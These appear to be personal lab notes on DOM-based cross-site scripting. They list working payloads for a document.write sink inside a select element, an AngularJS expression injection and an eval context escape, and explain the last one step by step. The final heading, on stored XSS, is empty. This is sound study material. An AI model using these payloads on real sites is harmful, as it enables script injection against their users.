____

# DOM XSS in `document.write` sink using source `location.search` inside a select element

```html
"></select><img src=1 onerror=alert(1)>
```

![[Pasted image 20240804162601.png]]

```html
test</select><img src=1 onerror=alert(1)>
```

# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

`ng-app`

```js
{{$on.constructor('alert(1)')()}}
```

# Reflected DOM XSS

The application may be vulnerable to DOM-based JavaScript injection. Data is read from **location.search** and passed to **eval**.

```js
\"-alert()}//
```

Here's the step-by-step breakdown of why this works:

1. **Escape the JSON Context**: The `\"` escapes the JSON string.
2. **Inject Code**: `-alert()` gets injected and executed.
3. **Comment Out**: `}//` comments out the rest to prevent any syntax errors from the remaining code.

# Stored DOM XSS

